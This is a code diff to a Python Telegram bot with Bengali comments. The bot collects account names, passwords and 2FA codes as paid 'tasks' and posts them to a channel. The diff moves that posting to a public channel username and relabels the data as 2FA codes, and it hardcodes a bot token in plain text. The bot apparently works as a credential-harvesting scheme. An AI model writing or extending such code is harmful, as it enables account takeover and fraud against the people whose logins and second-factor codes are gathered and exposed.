@@ -22,8 +22,8 @@ def run_flask():
 TOKEN = '8720565653:AAFltxQwffiTi5DmTwQKud-Wh1SkZlyVHm8'
 bot = telebot.TeleBot(TOKEN)
 
-# আপনার সঠিক চ্যানেল আইডি
-CHANNEL_ID = -1004424525431
+# আপনার পাবলিক চ্যানেলের ইউজারনেম
+CHANNEL_ID = "@hi54854"
 
 users_db = {}
 tasks_list = []  # সব টাস্ক মেমোরিতে জমানোর জন্য
@@ -179,14 +179,14 @@ def handle_menu(message):
             "data": text
         })
         
-        # চ্যানেলে মেসেজ পাঠানো
+        # পাবলিক চ্যানেলে মেসেজ পাঠানো
         channel_msg = (
             f"📥 **নতুন কাজ জমা পড়েছে!**\n\n"
             f"👤 **User ID:** `{user_id}`\n"
             f"📌 **Type:** {task_type}\n"
             f"🟢 **Name:** {acc_name}\n"
             f"🔐 **Pass:** {acc_pass}\n\n"
-            f"📄 **Submitted Data:**\n{text}"
+            f"📄 **Submitted Data (2FA):**\n{text}"
         )
         
         try:
@@ -194,7 +194,7 @@ def handle_menu(message):
         except Exception as e:
             print(f"Channel Send Error: {e}")
 
-        bot.send_message(message.chat.id, "✅ **আপনার ২FA কোডটি সফলভাবে জমা হয়েছে! এডমিন এটি যাচাই করে আপনার অ্যাকাউন্টে টাকা যোগ করে দেবে।**", reply_markup=main_keyboard(), parse_mode="Markdown")
+        bot.send_message(message.chat.id, "✅ **আপনার ২FA কোডটি সফলভাবে জমা হয়েছে এবং চ্যানেলে পাঠানো হয়েছে!**", reply_markup=main_keyboard(), parse_mode="Markdown")
         return
 
     # ২. উইথড্র পার্ট
@@ -285,4 +285,4 @@ if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.start()
     bot.infinity_polling()
-    
+        
